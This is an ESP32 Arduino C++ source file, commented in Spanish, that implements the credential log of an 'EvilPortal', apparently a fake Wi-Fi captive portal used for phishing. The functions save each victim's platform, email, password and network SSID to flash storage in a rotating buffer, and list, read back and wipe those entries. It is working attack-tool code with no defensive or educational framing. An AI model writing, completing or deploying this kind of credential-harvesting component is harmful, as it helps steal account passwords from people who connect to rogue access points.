#include "EvilPortalLogs.h"
#include <Preferences.h>

static const char* NVS_NAMESPACE = "evilportal";
static const char* NVS_COUNT_KEY = "log_count";

// Cada log se guarda en NVS con clave "logN" donde N es el índice (0..MAX_LOGS-1)
// El count es circular: siempre es el último escrito

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static int getStoredCount() {
    Preferences p;
    p.begin(NVS_NAMESPACE, true);
    int c = p.getInt(NVS_COUNT_KEY, 0);
    p.end();
    return c;
}

static void setStoredCount(int c) {
    Preferences p;
    p.begin(NVS_NAMESPACE, false);
    p.putInt(NVS_COUNT_KEY, c);
    p.end();
}

static String keyForLog(int idx) {
    return "log" + String(idx);
}

static void copyField(char* dst, const String& src, int maxLen) {
    int len = src.length();
    if (len > maxLen) len = maxLen;
    memcpy(dst, src.c_str(), len);
    dst[len] = '\0';
}

// ═══════════════════════════════════════════════════════════════════════════
//  API IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

bool portalLogAdd(const String& platform, const String& email,
                  const String& password, const String& ssid) {
    int count = getStoredCount();
    if (count < 0) count = 0;

    // Si ya llegamos al máximo, rotamos (sobrescribimos la más vieja)
    int writeIdx;
    if (count < MAX_LOGS) {
        writeIdx = count;
        count++;
    } else {
        writeIdx = count % MAX_LOGS;
        count++;   // seguimos incrementando para saber total histórico
    }

    PortalLog log;
    memset(&log, 0, sizeof(log));
    copyField(log.platform, platform, 15);
    copyField(log.email,    email,    MAX_FIELD_LEN);
    copyField(log.password, password, MAX_FIELD_LEN);
    copyField(log.ssid,     ssid,     32);
    log.timestampSec = millis() / 1000;
    log.bootNum      = (uint32_t)nvsGetULong("boot_cnt", 0);

    Preferences p;
    if (!p.begin(NVS_NAMESPACE, false)) return false;
    p.putBytes(keyForLog(writeIdx).c_str(), &log, sizeof(log));
    p.end();

    setStoredCount(count);
    return true;
}

int portalLogCount() {
    int c = getStoredCount();
    if (c > MAX_LOGS) return MAX_LOGS;
    if (c < 0) return 0;
    return c;
}

bool portalLogGet(int idx, PortalLog& out) {
    int count = getStoredCount();
    if (count <= 0) return false;

    // idx 0 = más reciente
    // Si count <= MAX_LOGS, el orden es simple: writeIdx = count - 1 - idx
    // Si count > MAX_LOGS, hay que calcular posición circular

    int actualCount = count > MAX_LOGS ? MAX_LOGS : count;
    if (idx < 0 || idx >= actualCount) return false;

    int physIdx;
    if (count <= MAX_LOGS) {
        physIdx = count - 1 - idx;
    } else {
        // Escritura circular: la última posición escrita fue (count-1) % MAX_LOGS
        int lastWrite = (count - 1) % MAX_LOGS;
        physIdx = (lastWrite - idx + MAX_LOGS) % MAX_LOGS;
    }

    Preferences p;
    if (!p.begin(NVS_NAMESPACE, true)) return false;
    size_t sz = p.getBytesLength(keyForLog(physIdx).c_str());
    if (sz != sizeof(PortalLog)) {
        p.end();
        return false;
    }
    p.getBytes(keyForLog(physIdx).c_str(), &out, sizeof(PortalLog));
    p.end();
    return true;
}

void portalLogClear() {
    Preferences p;
    p.begin(NVS_NAMESPACE, false);
    p.clear();
    p.end();
}